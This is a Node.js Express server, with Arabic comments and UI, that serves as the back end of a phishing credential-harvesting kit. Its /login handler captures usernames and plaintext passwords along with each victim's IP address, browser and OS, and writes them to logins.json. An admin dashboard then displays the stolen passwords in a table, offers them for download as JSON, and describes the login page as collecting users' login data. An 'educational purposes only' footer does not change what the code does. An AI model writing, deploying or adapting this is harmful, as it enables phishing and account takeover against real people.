const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");

const app = express();

// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// صفحة رئيسية لعرض الروابط
app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>نظام مراقبة بيانات تسجيل الدخول</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
            body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 20px; }
            .container { max-width: 1200px; margin: 0 auto; }
            .header { text-align: center; color: white; padding: 40px 0; }
            .header h1 { font-size: 2.5rem; margin-bottom: 10px; }
            .header p { font-size: 1.1rem; opacity: 0.9; }
            .cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-top: 30px; }
            .card { background: white; border-radius: 15px; padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); transition: transform 0.3s; }
            .card:hover { transform: translateY(-5px); }
            .card h2 { color: #333; margin-bottom: 15px; border-bottom: 2px solid #667eea; padding-bottom: 10px; }
            .card p { color: #666; margin-bottom: 20px; line-height: 1.6; }
            .btn { display: inline-block; background: #667eea; color: white; padding: 12px 25px; border-radius: 8px; text-decoration: none; font-weight: bold; transition: background 0.3s; }
            .btn:hover { background: #5a67d8; }
            .data-preview { background: #f8f9fa; padding: 15px; border-radius: 8px; margin-top: 15px; font-family: monospace; max-height: 200px; overflow-y: auto; }
            .footer { text-align: center; color: white; margin-top: 50px; padding: 20px; opacity: 0.8; }
            @media (max-width: 768px) {
                .cards { grid-template-columns: 1fr; }
                .header h1 { font-size: 2rem; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🛡️ نظام مراقبة بيانات تسجيل الدخول</h1>
                <p>لوحة التحكم - يمكنك الوصول للبيانات المخزنة من خلال الروابط التالية</p>
            </div>
            
            <div class="cards">
                <div class="card">
                    <h2>📊 عرض جميع البيانات</h2>
                    <p>شاهد جميع بيانات تسجيل الدخول المحفوظة في نظام JSON</p>
                    <a href="/view-data" class="btn" target="_blank">فتح صفحة البيانات</a>
                    <div class="data-preview" id="dataPreview">جار التحميل...</div>
                </div>
                
                <div class="card">
                    <h2>📝 صفحة تسجيل الدخول</h2>
                    <p>الصفحة التي تظهر للمستخدمين لجمع بيانات تسجيل الدخول</p>
                    <a href="/login.html" class="btn" target="_blank">فتح صفحة التسجيل</a>
                </div>
                
                <div class="card">
                    <h2>📥 تحميل البيانات</h2>
                    <p>حمل ملف JSON كامل يحتوي على جميع البيانات</p>
                    <a href="/download" class="btn">تحميل ملف JSON</a>
                    <p style="margin-top: 10px; font-size: 14px;">أو استخدم الرابط المباشر: /api/data</p>
                </div>
            </div>
            
            <div class="footer">
                <p>تم تطوير هذا النظام لأغراض تعليمية فقط | ${new Date().getFullYear()}</p>
            </div>
        </div>
        
        <script>
            // عرض معاينة للبيانات
            fetch('/api/data')
                .then(res => res.json())
                .then(data => {
                    const preview = document.getElementById('dataPreview');
                    if(data.logins && data.logins.length > 0) {
                        const lastEntry = data.logins[data.logins.length - 1];
                        preview.textContent = JSON.stringify(lastEntry, null, 2);
                    } else {
                        preview.textContent = 'لا توجد بيانات حتى الآن';
                    }
                })
                .catch(err => {
                    document.getElementById('dataPreview').textContent = 'خطأ في تحميل البيانات';
                });
        </script>
    </body>
    </html>
  `);
});

// استقبال بيانات تسجيل الدخول
app.post("/login", (req, res) => {
  const { username, password } = req.body;
  
  console.log("📥 تم استقبال بيانات جديدة:", username, password);
  
  const loginData = {
    username: username,
    password: password,
    timestamp: new Date().toLocaleString("ar-SA"),
    ip: req.ip || req.connection.remoteAddress,
    userAgent: req.headers["user-agent"],
    browser: getBrowserInfo(req.headers["user-agent"]),
    os: getOSInfo(req.headers["user-agent"])
  };
  
  const filePath = path.join(__dirname, "logins.json");
  let allLogins = [];
  
  try {
    if (fs.existsSync(filePath)) {
      const fileContent = fs.readFileSync(filePath, "utf8");
      if (fileContent.trim() !== "") {
        allLogins = JSON.parse(fileContent);
      }
    }
  } catch (error) {
    console.log("⚠️ إنشاء ملف جديد...");
  }
  
  allLogins.push(loginData);
  
  try {
    fs.writeFileSync(filePath, JSON.stringify(allLogins, null, 2), "utf8");
    console.log("✅ تم حفظ البيانات في logins.json");
    res.status(200).send("تم استقبال البيانات بنجاح");
  } catch (error) {
    console.error("❌ خطأ في حفظ البيانات:", error);
    res.status(500).send("حدث خطأ في الخادم");
  }
});

// صفحة لعرض البيانات بطريقة جميلة
app.get("/view-data", (req, res) => {
  const filePath = path.join(__dirname, "logins.json");
  
  try {
    if (fs.existsSync(filePath)) {
      const fileContent = fs.readFileSync(filePath, "utf8");
      const logins = fileContent.trim() ? JSON.parse(fileContent) : [];
      
      res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>عرض البيانات المخزنة</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
                body { background: #f5f5f5; padding: 20px; }
                .container { max-width: 1400px; margin: 0 auto; }
                .header { background: white; padding: 25px; border-radius: 10px; margin-bottom: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
                .header h1 { color: #1877f2; margin-bottom: 10px; }
                .stats { display: flex; gap: 20px; margin-top: 20px; flex-wrap: wrap; }
                .stat-box { background: #f8f9fa; padding: 15px; border-radius: 8px; flex: 1; min-width: 200px; }
                .stat-box h3 { color: #666; margin-bottom: 10px; }
                .stat-box .number { font-size: 2rem; font-weight: bold; color: #1877f2; }
                .table-container { background: white; padding: 20px; border-radius: 10px; overflow-x: auto; }
                table { width: 100%; border-collapse: collapse; }
                th { background: #1877f2; color: white; padding: 15px; text-align: right; }
                td { padding: 12px; border-bottom: 1px solid #eee; }
                tr:hover { background: #f9f9f9; }
                .password { font-family: monospace; background: #f0f0f0; padding: 3px 8px; border-radius: 3px; }
                .timestamp { color: #666; font-size: 0.9em; }
                .actions { display: flex; gap: 10px; margin-top: 20px; }
                .btn { display: inline-block; background: #1877f2; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; margin: 5px; }
                .btn.download { background: #28a745; }
                .btn.clear { background: #dc3545; }
                .btn.back { background: #6c757d; }
                .empty-state { text-align: center; padding: 50px; color: #666; }
                .empty-state i { font-size: 3rem; margin-bottom: 20px; opacity: 0.5; }
                @media (max-width: 768px) {
                    .stats { flex-direction: column; }
                    th, td { padding: 8px; font-size: 14px; }
                }
            </style>
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1><i class="fas fa-database"></i> البيانات المخزنة</h1>
                    <p>جميع بيانات تسجيل الدخول التي تم جمعها</p>
                    
                    <div class="stats">
                        <div class="stat-box">
                            <h3>إجمالي التسجيلات</h3>
                            <div class="number">${logins.length}</div>
                        </div>
                        <div class="stat-box">
                            <h3>آخر تسجيل</h3>
                            <div class="timestamp">${logins.length > 0 ? logins[logins.length - 1].timestamp : 'لا يوجد'}</div>
                        </div>
                        <div class="stat-box">
                            <h3>الملف</h3>
                            <div>logins.json</div>
                        </div>
                    </div>
                    
                    <div class="actions">
                        <a href="/" class="btn back"><i class="fas fa-home"></i> الرئيسية</a>
                        <a href="/download" class="btn download"><i class="fas fa-download"></i> تحميل JSON</a>
                        <a href="javascript:clearData()" class="btn clear"><i class="fas fa-trash"></i> حذف الكل</a>
                        <a href="/api/data" target="_blank" class="btn"><i class="fas fa-code"></i> عرض JSON خام</a>
                    </div>
                </div>
                
                <div class="table-container">
                    ${logins.length > 0 ? `
                        <table>
                            <thead>
                                <tr>
                                    <th>#</th>
                                    <th>اسم المستخدم</th>
                                    <th>كلمة السر</th>
                                    <th>الوقت</th>
                                    <th>IP</th>
                                    <th>المتصفح</th>
                                    <th>نظام التشغيل</th>
                                </tr>
                            </thead>
                            <tbody>
                                ${logins.map((login, index) => `
                                    <tr>
                                        <td>${index + 1}</td>
                                        <td><strong>${escapeHtml(login.username)}</strong></td>
                                        <td><span class="password">${escapeHtml(login.password)}</span></td>
                                        <td class="timestamp">${login.timestamp}</td>
                                        <td><small>${login.ip}</small></td>
                                        <td><small>${login.browser || 'غير معروف'}</small></td>
                                        <td><small>${login.os || 'غير معروف'}</small></td>
                                    </tr>
                                `).join('')}
                            </tbody>
                        </table>
                    ` : `
                        <div class="empty-state">
                            <i class="fas fa-database"></i>
                            <h2>لا توجد بيانات حتى الآن</h2>
                            <p>لم يتم حفظ أي بيانات تسجيل دخول بعد.</p>
                            <a href="/login.html" class="btn">اذهب إلى صفحة التسجيل</a>
                        </div>
                    `}
                </div>
            </div>
            
            <script>
                function escapeHtml(text) {
                    return text
                        .replace(/&/g, "&amp;")
                        .replace(/</g, "&lt;")
                        .replace(/>/g, "&gt;")
                        .replace(/"/g, "&quot;")
                        .replace(/'/g, "&#039;");
                }
                
                function clearData() {
                    if(confirm('هل أنت متأكد من حذف جميع البيانات؟ لا يمكن التراجع عن هذا الإجراء.')) {
                        fetch('/api/clear', {
                            method: 'DELETE'
                        })
                        .then(res => res.json())
                        .then(data => {
                            if(data.success) {
                                alert('تم حذف جميع البيانات');
                                location.reload();
                            }
                        });
                    }
                }
                
                // تحديث الصفحة كل 10 ثواني
                setInterval(() => {
                    if(${logins.length} > 0) {
                        location.reload();
                    }
                }, 10000);
            </script>
        </body>
        </html>
      `);
    } else {
      res.send("<h1>لم يتم إنشاء ملف البيانات بعد</h1>");
    }
  } catch (error) {
    res.status(500).send("خطأ في قراءة البيانات: " + error.message);
  }
});

// رابط API لعرض البيانات كـ JSON
app.get("/api/data", (req, res) => {
  const filePath = path.join(__dirname, "logins.json");
  
  try {
    if (fs.existsSync(filePath)) {
      const fileContent = fs.readFileSync(filePath, "utf8");
      const logins = fileContent.trim() ? JSON.parse(fileContent) : [];
      
      res.json({
        success: true,
        count: logins.length,
        logins: logins,
        lastUpdated: new Date().toISOString()
      });
    } else {
      res.json({
        success: true,
        count: 0,
        logins: [],
        message: "لم يتم إنشاء ملف البيانات بعد"
      });
    }
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// رابط لتحميل ملف JSON
app.get("/download", (req, res) => {
  const filePath = path.join(__dirname, "logins.json");
  
  if (fs.existsSync(filePath)) {
    res.download(filePath, `logins-${new Date().toISOString().split('T')[0]}.json`);
  } else {
    res.status(404).send("ملف البيانات غير موجود");
  }
});

// رابط لحذف جميع البيانات
app.delete("/api/clear", (req, res) => {
  const filePath = path.join(__dirname, "logins.json");
  
  try {
    fs.writeFileSync(filePath, JSON.stringify([], null, 2), "utf8");
    res.json({
      success: true,
      message: "تم حذف جميع البيانات بنجاح"
    });
  } catch (error) {
    res.json({
      success: false,
      error: error.message
    });
  }
});

// وظائف مساعدة
function getBrowserInfo(userAgent) {
  if (!userAgent) return "غير معروف";
  
  if (userAgent.includes("Chrome")) return "Chrome";
  if (userAgent.includes("Firefox")) return "Firefox";
  if (userAgent.includes("Safari")) return "Safari";
  if (userAgent.includes("Edge")) return "Edge";
  if (userAgent.includes("Opera")) return "Opera";
  return "متصفح آخر";
}

function getOSInfo(userAgent) {
  if (!userAgent) return "غير معروف";
  
  if (userAgent.includes("Windows")) return "Windows";
  if (userAgent.includes("Mac")) return "MacOS";
  if (userAgent.includes("Linux")) return "Linux";
  if (userAgent.includes("Android")) return "Android";
  if (userAgent.includes("iPhone") || userAgent.includes("iPad")) return "iOS";
  return "نظام آخر";
}

// تشغيل السيرفر
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 السيرفر يعمل على المنفذ ${PORT}`);
  console.log(`🌐 الروابط المتاحة:`);
  console.log(`   📍 الرئيسية: http://localhost:${PORT}/`);
  console.log(`   📊 عرض البيانات: http://localhost:${PORT}/view-data`);
  console.log(`   📥 صفحة تسجيل الدخول: http://localhost:${PORT}/login.html`);
  console.log(`   🔗 API للبيانات: http://localhost:${PORT}/api/data`);
  console.log(`   ⬇️ تحميل JSON: http://localhost:${PORT}/download`);
});
